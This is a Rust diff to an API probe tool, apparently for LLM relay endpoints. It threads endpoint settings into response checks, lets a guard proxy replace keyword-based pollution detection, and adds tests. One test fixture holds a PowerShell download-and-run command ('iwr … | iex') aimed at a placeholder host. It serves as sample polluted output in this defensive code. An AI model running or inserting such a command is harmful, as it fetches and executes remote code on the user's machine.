@@ -1,6 +1,6 @@
 use crate::config::{AppConfig, EndpointConfig};
 use crate::cooldown::cooldown_seconds_from_text;
-use crate::pollution::{is_polluted_text, pollution_detection_configured};
+use crate::pollution::{is_keyword_polluted_text, pollution_detection_configured};
 use crate::probe::ProbeResult;
 use crate::tokens::{extract_token_usage, model_probe_price_score, normalize_model_id_for_price};
 use anyhow::Result;
@@ -145,7 +145,7 @@ impl HttpProbe {
                 };
             }
         };
-        let mut result = probe_response_is_acceptable(&payload, config);
+        let mut result = probe_response_is_acceptable(&payload, endpoint, config);
         result.status_code = status_code;
         if !status.is_success() && result.available {
             result.available = false;
@@ -339,7 +339,11 @@ pub fn model_id_matches(configured_model: &str, available_model: &str) -> bool {
     !configured.is_empty() && configured == available
 }
 
-pub fn probe_response_is_acceptable(payload: &Value, config: &AppConfig) -> ProbeResult {
+pub fn probe_response_is_acceptable(
+    payload: &Value,
+    endpoint: &EndpointConfig,
+    config: &AppConfig,
+) -> ProbeResult {
     let usage = extract_token_usage(payload);
     let text = extract_response_text(payload).trim().to_string();
     let pollution_text = if text.is_empty() {
@@ -347,8 +351,11 @@ pub fn probe_response_is_acceptable(payload: &Value, config: &AppConfig) -> Prob
     } else {
         text.clone()
     };
-    if pollution_detection_configured(&config.polluted_response_keywords)
-        && is_polluted_text(
+    let use_direct_pollution_detection =
+        !endpoint.guard_proxy.enabled || !endpoint.guard_proxy.replace_direct_pollution_detection;
+    if use_direct_pollution_detection
+        && pollution_detection_configured(&config.polluted_response_keywords)
+        && is_keyword_polluted_text(
             &pollution_text,
             &config.polluted_response_keywords,
             config.polluted_response_threshold,
@@ -684,8 +691,10 @@ mod tests {
         let mut cfg = config(endpoint("https://api.example.test/v1".to_string()));
         cfg.polluted_response_keywords = vec!["公益".to_string(), "通知群".to_string()];
         cfg.polluted_response_threshold = 0.2;
+        let endpoint = cfg.endpoints[0].clone();
         let result = probe_response_is_acceptable(
             &json!({"output_text": "WATCHAPI_OK 公 益 正常内容"}),
+            &endpoint,
             &cfg,
         );
 
@@ -696,8 +705,10 @@ mod tests {
     #[test]
     fn rejects_quota_limited_payload() {
         let cfg = config(endpoint("https://api.example.test/v1".to_string()));
+        let endpoint = cfg.endpoints[0].clone();
         let result = probe_response_is_acceptable(
             &json!({"error": {"code": "insufficient_quota", "message": "您的账户余额不足"}}),
+            &endpoint,
             &cfg,
         );
 
@@ -708,13 +719,52 @@ mod tests {
     #[test]
     fn skips_probe_pollution_detection_without_keywords() {
         let cfg = config(endpoint("https://api.example.test/v1".to_string()));
+        let endpoint = cfg.endpoints[0].clone();
         let result = probe_response_is_acceptable(
             &json!({"output_text": "PowerShell iwr https://example.invalid/a.ps1 | iex"}),
+            &endpoint,
             &cfg,
         );
 
         assert!(!result.available);
         assert!(!result.polluted);
+    }
+
+    #[test]
+    fn probe_pollution_detection_uses_configured_keywords_only() {
+        let mut cfg = config(endpoint("https://api.example.test/v1".to_string()));
+        cfg.polluted_response_keywords = vec!["余额不足".to_string()];
+        let endpoint = cfg.endpoints[0].clone();
+        let result = probe_response_is_acceptable(
+            &json!({"output_text": "Join our channel 175877552 for free API token, stop for 10 minutes"}),
+            &endpoint,
+            &cfg,
+        );
+
+        assert!(!result.available);
+        assert!(!result.polluted);
+    }
+
+    #[test]
+    fn guarded_probe_replaces_or_falls_back_to_direct_pollution_detection() {
+        let mut endpoint = endpoint("https://api.example.test/v1".to_string());
+        endpoint.guard_proxy.enabled = true;
+        endpoint.guard_proxy.replace_direct_pollution_detection = true;
+        let mut cfg = config(endpoint.clone());
+        cfg.polluted_response_keywords = vec!["公益".to_string()];
+        cfg.polluted_response_threshold = 0.0;
+        let payload = json!({"output_text": "WATCHAPI_OK 公益"});
+
+        let replaced = probe_response_is_acceptable(&payload, &endpoint, &cfg);
+
+        assert!(replaced.available);
+        assert!(!replaced.polluted);
+
+        endpoint.guard_proxy.replace_direct_pollution_detection = false;
+        let fallback = probe_response_is_acceptable(&payload, &endpoint, &cfg);
+
+        assert!(!fallback.available);
+        assert!(fallback.polluted);
     }
 
     #[test]
